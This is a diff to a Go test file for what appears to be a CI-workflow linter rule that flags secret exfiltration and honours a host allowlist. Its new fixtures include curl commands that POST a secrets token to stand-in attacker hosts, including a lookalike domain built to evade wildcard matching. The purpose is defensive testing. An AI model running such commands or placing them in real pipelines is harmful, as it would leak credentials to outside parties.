@@ -1969,29 +1969,45 @@ func TestSecretExfiltration_AllowedHosts_NoConfigUnchanged(t *testing.T) {
 }
 
 func TestNormalizeAllowedHost(t *testing.T) {
+	// wantReasonContains is a substring assertion (not full match) so message
+	// wording can be refined without churn, while still detecting silent
+	// rejection-category regressions (e.g. a scheme-prefix entry reclassified
+	// as a generic invalid host).
 	tests := []struct {
-		input string
-		want  string
+		input              string
+		want               string
+		wantReasonContains string
 	}{
-		{"api.example.com", "api.example.com"},
-		{"  API.example.COM ", "api.example.com"},
-		{`"api.example.com"`, "api.example.com"},
-		{"*.example.com", "*.example.com"},
-		{"*.Example.com", "*.example.com"},
-		// Rejected forms.
-		{"", ""},
-		{"*", ""},
-		{"foo.*.bar", ""},
-		{"**.example.com", ""},
-		{"https://api.example.com", ""},
-		{"api.example.com/path", ""},
-		{"api.example.com:443", ""},
-		{"api example.com", ""},
+		{"api.example.com", "api.example.com", ""},
+		{"  API.example.COM ", "api.example.com", ""},
+		{`"api.example.com"`, "api.example.com", ""},
+		{"*.example.com", "*.example.com", ""},
+		{"*.Example.com", "*.example.com", ""},
+		// Rejected forms — each pinned to its specific reason category so a
+		// regression that lumps everything under a generic error becomes a
+		// test failure.
+		{"", "", "empty"},
+		{"*", "", "wildcard"},
+		{"foo.*.bar", "", "wildcard"},
+		{"**.example.com", "", "wildcard"},
+		{"https://api.example.com", "", "scheme"},
+		{"api.example.com/path", "", "path"},
+		{"api.example.com:443", "", "port"},
+		{"api example.com", "", "whitespace"},
 	}
 	for _, tt := range tests {
-		got, _ := normalizeAllowedHost(tt.input)
+		got, reason := normalizeAllowedHost(tt.input)
 		if got != tt.want {
 			t.Errorf("normalizeAllowedHost(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+		if tt.wantReasonContains == "" {
+			if reason != "" {
+				t.Errorf("normalizeAllowedHost(%q) reason = %q, want empty for accepted entry", tt.input, reason)
+			}
+			continue
+		}
+		if !strings.Contains(reason, tt.wantReasonContains) {
+			t.Errorf("normalizeAllowedHost(%q) reason = %q, want substring %q", tt.input, reason, tt.wantReasonContains)
 		}
 	}
 }
@@ -2241,5 +2257,67 @@ func TestSecretExfiltration_AllowedHosts_DirectiveScopedToTopLevel(t *testing.T)
 	}
 	if !foundExfiltration {
 		t.Errorf("deep-node directive should NOT suppress the finding, but no exfiltration finding was emitted; errors=%v", rule.Errors())
+	}
+}
+
+// TestSecretExfiltration_AllowedHosts_MixedDestinations locks in the
+// all-or-nothing suppression contract of networkCallMatchesAllowlist: a
+// single curl invocation that lists multiple destinations is suppressed
+// only when *every* destination matches the allowlist. If even one
+// destination is outside the allowlist, the finding must still fire —
+// otherwise an attacker could smuggle exfiltration into a call that also
+// hits a trusted host.
+func TestSecretExfiltration_AllowedHosts_MixedDestinations(t *testing.T) {
+	tests := []struct {
+		name      string
+		script    string
+		allowed   []string
+		wantCount int
+	}{
+		{
+			// Both destinations are listed in the allowlist: legitimate
+			// fan-out to two trusted vendor endpoints.
+			name:      "all destinations trusted suppresses finding",
+			script:    `curl -X POST https://api.example.com https://other.example.com -d "token=${{ secrets.X }}"`,
+			allowed:   []string{"api.example.com", "other.example.com"},
+			wantCount: 0,
+		},
+		{
+			// One trusted + one untrusted: must NOT be suppressed.
+			name:      "one untrusted destination keeps finding",
+			script:    `curl -X POST https://api.example.com https://attacker.com -d "token=${{ secrets.X }}"`,
+			allowed:   []string{"api.example.com"},
+			wantCount: 1,
+		},
+		{
+			// Wildcard covers both: still suppressed.
+			name:      "wildcard covers all destinations",
+			script:    `curl -X POST https://api.example.com https://other.example.com -d "token=${{ secrets.X }}"`,
+			allowed:   []string{"*.example.com"},
+			wantCount: 0,
+		},
+		{
+			// Wildcard covers one, lookalike sneaks past: must still fire.
+			// "example.com.attacker.com" is NOT a subdomain of example.com,
+			// so the all-or-nothing rule keeps it flagged.
+			name:      "wildcard does not cover lookalike second destination",
+			script:    `curl -X POST https://api.example.com https://example.com.attacker.com -d "token=${{ secrets.X }}"`,
+			allowed:   []string{"*.example.com"},
+			wantCount: 1,
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := runSecretExfiltrationRuleWithAllowedHosts(tt.script, tt.allowed)
+			count := 0
+			for _, e := range got {
+				if !strings.Contains(e.Description, "did not match any network command destination") {
+					count++
+				}
+			}
+			if count != tt.wantCount {
+				t.Errorf("%s: expected %d findings, got %d: %v", tt.name, tt.wantCount, count, got)
+			}
+		})
 	}
 }
